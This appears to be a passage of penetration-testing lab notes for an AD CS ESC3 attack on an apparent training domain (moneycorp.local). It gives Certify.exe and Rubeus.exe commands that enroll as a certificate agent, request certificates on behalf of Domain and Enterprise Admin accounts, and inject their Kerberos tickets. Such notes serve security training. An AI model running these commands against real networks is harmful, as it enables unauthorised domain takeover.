### Escalation to DA

* We can now request a certificate for Certificate Request Agent from "SmartCardEnrollment-Agent" template.
```
Certify.exe request /ca:mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA /template:SmartCardEnrollment-Agent
```

* Convert from cert.pem to pfx (esc3agent.pfx below) and use it to request a certificate on behalf of DA using the "SmartCardEnrollment-Users" template.
```
Certify.exe request /ca:mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA /template:SmartCardEnrollment-Users /onbehalfof:dcorp\administrator
/enrollcert:esc3agent.pfx /enrollcertpw:SecretPass@123
```

* Convert from cert.pem to pfx (esc3user-DA.pfx below), request DA TGT and inject it:
```
Rubeus.exe asktgt /user:administrator /certificate:esc3user-DA.pfx
/password:SecretPass@123 /ptt
```

### Escalation to EA

* Convert from cert.pem to pfx (esc3agent.pfx below) and use it to request a certificate on behalf of EA using the "SmartCardEnrollment-Users" template.
```
Certify.exe request /ca:mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA /template:SmartCardEnrollment-Users /onbehalfof:moneycorp.local\administrator
/enrollcert:esc3agent.pfx /enrollcertpw:SecretPass@123
```

* Request EA TGT and inject it :
```
Rubeus.exe asktgt /user:moneycorp.local\administrator /certificate:esc3user.pfx /dc:mcorp-dc.moneycorp.local /password:SecretPass@123 /ptt
```

